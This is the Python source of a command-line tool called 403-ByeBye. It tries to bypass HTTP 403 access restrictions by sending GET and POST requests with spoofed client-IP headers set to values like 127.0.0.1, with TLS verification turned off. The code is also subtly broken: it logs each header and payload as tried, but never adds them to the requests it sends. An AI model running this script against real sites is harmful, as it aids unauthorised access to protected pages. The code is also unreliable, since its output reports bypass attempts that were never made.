"""
403-ByeBye
Bypass 403 Forbidden Error
https://github.com/nxenon/403-byebye
  _  _    ___ ____    ____             ____
 | || |  / _ \___ \  |  _ \           |  _ \
 | || |_| | | |__) | | |_) |_   _  ___| |_) |_   _  ___
 |__   _| | | |__ <  |  _ <| | | |/ _ \  _ <| | | |/ _ \
    | | | |_| |__) | | |_) | |_| |  __/ |_) | |_| |  __/
    |_|  \___/____/  |____/ \__, |\___|____/ \__, |\___|
                             __/ |            __/ |
                            |___/            |___/
"""

import requests
from argparse import ArgumentParser
# disable certificate warning
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import colorama


def print_banner():
    VERSION = 'Beta'
    banner_text = f'''
  _  _    ___ ____    ____             ____             
 | || |  / _ \___ \  |  _ \           |  _ \  Version: {VERSION}
 | || |_| | | |__) | | |_) |_   _  ___| |_) |_   _  ___ 
 |__   _| | | |__ <  |  _ <| | | |/ _ \  _ <| | | |/ _ \\
    | | | |_| |__) | | |_) | |_| |  __/ |_) | |_| |  __/
    |_|  \___/____/  |____/ \__, |\___|____/ \__, |\___|
                             __/ |            __/ |     
                            |___/            |___/      
    '''

    print(banner_text)


class Bypasser:

    def __init__(self, args):
        self.all_arguments = args
        self.timeout = 3.0
        self.payloads = ['127.0.0.1']
        self.bypass_headers = [
            'X-Originating-IP',
            'X-Forwarded-For',
            'X-Forwarded',
            'Forwarded-For',
            'X-Remote-IP',
            'X-Remote-Addr',
            'X-ProxyUser-Ip',
            'X-Original-URL',
            'Client-IP',
            'True-Client-IP',
            'Cluster-Client-IP',
            'X-ProxyUser-Ip',
            'Host',
        ]
        self.data_dict = {}
        self.headers_dict = {}
        self.cookies_dict = {}
        self.http_methods = ['GET']
        self.url = self.all_arguments.url
        self.proxies = {
            "http": None,
            "https": None,
        }
        self.is_colorful = not self.all_arguments.no_color

    def log(self, text, text_type='normal'):
        """
        Print Function
        :return:
        """
        if text_type == 'verbose':
            if self.all_arguments.verbose:
                print(text)
        else:
            print(text)

    def check_timeout(self):
        try:
            self.timeout = float(self.all_arguments.timeout)
        except ValueError:
            self.log('timeout must be integer e.g 3.0')
            exit(1)

    def check_bypass_values(self):
        """
        check bypass values [payloads] if they are set in arguments
        :return:
        """

        if self.all_arguments.add_payload is not None:
            self.payloads = []
            for payload_item in self.all_arguments.add_payload:
                self.payloads.append(payload_item[0])

    def check_datas(self):
        """
        check Datas if they are set in arguments [--add-data]
        :return:
        """
        if self.all_arguments.add_data is not None:
            for data_item in self.all_arguments.add_data:
                self.data_dict[data_item[0]] = data_item[1]

    def check_cookies(self):
        """
        check cookies if they are set in arguments [--add-cookie]
        :return:
        """
        if self.all_arguments.add_cookie is not None:
            for cookie_item in self.all_arguments.add_cookie:
                self.cookies_dict[cookie_item[0]] = cookie_item[1]

    def check_extra_headers(self):
        """
        check extra headers if they are set in arguments [--add-extra-headers]
        :return:
        """
        if self.all_arguments.add_extra_header is not None:
            for header_item in self.all_arguments.add_extra_header:
                self.headers_dict[header_item[0]] = header_item[1]

    def check_methods(self):
        """
        check Request Methods
        :return:
        """

        available_methods = ['GET', 'POST']
        methods_string = self.all_arguments.methods.lower()
        methods_list = methods_string.split(',')  # methods entered by user [default: "get"]
        methods_list = list(map(lambda x: x.strip().upper(), methods_list))
        for m in methods_list:
            if m not in available_methods:
                self.log(f'Invalid HTTP Method : {m}')
                self.log(f'Available Verbs: {" ".join(available_methods)}')
                exit(1)

        self.http_methods = methods_list

    def check_proxy(self):
        if self.all_arguments.set_proxy is None:
            return
        available_protocols = ['http', 'https']
        proxy_protocol = self.all_arguments.set_proxy[0]
        proxy_address = self.all_arguments.set_proxy[1]
        if proxy_protocol not in available_protocols:
            self.log('Invalid Proxy Protocol')
            self.log(f'Available Protocols : {" ".join(available_protocols)}')
            self.log('Example: --set-proxy https 127.0.0.1:8080')
            exit(1)

        self.proxies[proxy_protocol] = proxy_address

        if (self.proxies['http'] is not None) or (self.proxies['https'] is not None):
            self.timeout = None

    def print_config(self):
        temp_text = f"""
        
+--######################################################--+
URL:             {self.url}
HTTP Methods:    {self.http_methods}
Payloads:        {self.payloads}
Extra Headers:   {self.headers_dict}
Data:            {self.data_dict}
Cookies:         {self.cookies_dict}
Proxy:           {self.proxies}
Timeout:         {self.timeout}
Using JSON:      {self.all_arguments.use_json}
Verbose:         {self.all_arguments.verbose}
+--######################################################--+

        """

        print(temp_text)

    def send_requests(self):
        if 'GET' in self.http_methods:
            self.send_get_requests()

        if 'POST' in self.http_methods:
            self.send_post_requests()

    def send_get_requests(self):
        for bypass_header in self.bypass_headers:
            for payload in self.payloads:
                try:
                    req = requests.get(url=self.url, params=self.data_dict, timeout=self.timeout, verify=False,
                                       headers=self.headers_dict, cookies=self.cookies_dict, proxies=self.proxies)

                except Exception as e:
                    self.log(text='[--BEGIN--]')
                    self.log(text=f'Error in GET Request')
                    self.log(text=f'Error Message: {e}')
                    self.log(text='[--END--]')

                else:
                    self.log('++---------------------------------------++')
                    self.log(f'Payload --> {bypass_header}: {payload}')
                    if not self.is_colorful:
                        self.log(
                            f'[GET]     Response Length: [{str(len(req.content))}] Status Code: [{str(req.status_code)}]')
                    else:
                        if req.status_code == 200:
                            text = colorama.Fore.GREEN + str(req.status_code) + colorama.Fore.RESET

                        elif req.status_code == 403:
                            text = req.status_code

                        else:
                            text = colorama.Fore.CYAN + str(req.status_code) + colorama.Fore.RESET

                        self.log(
                            f'[GET]     Response Length: [{str(len(req.content))}] Status Code: [{text}]')
                    self.log('++---------------------------------------++')

    def send_post_requests(self):
        for bypass_header in self.bypass_headers:
            for payload in self.payloads:
                try:
                    if self.data_dict:
                        if self.all_arguments.use_json:
                            req = requests.post(url=self.url, json=self.data_dict, timeout=self.timeout, verify=False,
                                                headers=self.headers_dict, cookies=self.cookies_dict,
                                                proxies=self.proxies)
                        else:
                            req = requests.post(url=self.url, data=self.data_dict, timeout=self.timeout, verify=False,
                                                headers=self.headers_dict, cookies=self.cookies_dict,
                                                proxies=self.proxies)
                    else:
                        req = requests.post(url=self.url, headers=self.headers_dict, timeout=self.timeout, verify=False,
                                            cookies=self.cookies_dict, proxies=self.proxies)

                except Exception as e:
                    self.log(text='[--BEGIN--]')
                    self.log(text=f'Error in POST Request')
                    self.log(text=f'Error Message: {e}')
                    self.log(text='[--END--]')

                else:
                    self.log('++---------------------------------------++')
                    self.log(f'Payload --> {bypass_header}: {payload}')
                    if not self.is_colorful:
                        self.log(
                            f'[POST]     Response Length: [{str(len(req.content))}] Status Code: [{str(req.status_code)}]')
                    else:
                        if req.status_code == 200:
                            text = colorama.Fore.GREEN + str(req.status_code) + colorama.Fore.RESET

                        elif req.status_code == 403:
                            text = req.status_code

                        else:
                            text = colorama.Fore.CYAN + str(req.status_code) + colorama.Fore.RESET

                        self.log(
                            f'[POST]     Response Length: [{str(len(req.content))}] Status Code: [{text}]')
                    self.log('++---------------------------------------++')

    def start(self):
        self.check_timeout()
        self.check_methods()
        self.check_bypass_values()
        self.check_datas()
        self.check_cookies()
        self.check_extra_headers()
        self.check_proxy()
        self.print_config()

        self.send_requests()

    def run_extra_bypasses(self):
        """
        TODO
        :return:
        """


def print_parser_help():
    help_text = '''Arguments:
  --url                 -u     Target URL
  --methods             -m     Methods for Request (Available: GET,POST) [default GET]
  --use-json            -uj    Use Json Content-Type for POST Request instead of x-www-form-urlencoded
  --add-payload         -ap    Add Bypass-Value(payload) for Replacing in Headers [default 127.0.0.1]
  --add-data            -ad    Add Data for Request
  --add-cookie          -ac    Add Cookie for Request
  --add-extra-header    -aeh   Add Extra Header for Request
  --set-proxy           -sp    Set Proxy for Requests [http, https](when proxy is set timeout sets to None)
  --verbose             -v     Verbose Output
  --timeout             -t     Timeout in seconds if URL is Using [Default 3.0]
  --no-color            -nc    Print Output Without Color

Examples:
--url https://www.example.com/admin
--url https://www.example.com/admin --timeout 2.0 --methods GET --set-proxy https 127.0.0.1:8080
--url https://www.example.com/admin --add-payload 127.0.0.1 --add-payload localhost
--url https://www.example.com/admin --methods "GET,POST" --use-json --verbose
--url https://www.example.com/admin --add-data key1 value1 --add-data key2 value2
--url https://www.example.com/admin --add-cookie cookieName1 value1 --add-cookie cookieName2 value2
--url https://www.example.com/admin --add-extra-header headerName test --add-extra-header headerName2 test2
        '''

    print(help_text)


def start_parser():
    parser = ArgumentParser(
        usage='python3 403-byebye.py --script-help [for help]',
        allow_abbrev=False, add_help=False)
    parser.add_argument('--script-help', '-sh', action='store_true')
    parser.add_argument('--url', '-u')
    parser.add_argument('--methods', '-m', default='get')
    parser.add_argument('--use-json', '-uj', default=False, action='store_true')
    parser.add_argument('--add-payload', '-ap', action='append', nargs=1)
    parser.add_argument('--add-data', '-ad', action='append', nargs=2)
    parser.add_argument('--add-cookie', '-ac', action='append', nargs=2)
    parser.add_argument('--add-extra-header', '-aeh', action='append', nargs=2)
    parser.add_argument('--set-proxy', '-sp', nargs=2)
    parser.add_argument('--verbose', '-v', default=False, action='store_true')
    parser.add_argument('--timeout', '-t', default=3.0)
    parser.add_argument('--no-color', '-nc', default=False, action='store_true')

    args, unknown = parser.parse_known_args()
    if (args.script_help is not None) and (args.script_help is True):
        print_parser_help()
        exit()

    if args.url is not None:
        bypasser = Bypasser(args=args)
        bypasser.start()

    else:
        print('You have to set target!')
        print('--url')
        parser.print_usage()
        exit()


if __name__ == '__main__':
    print_banner()
    start_parser()
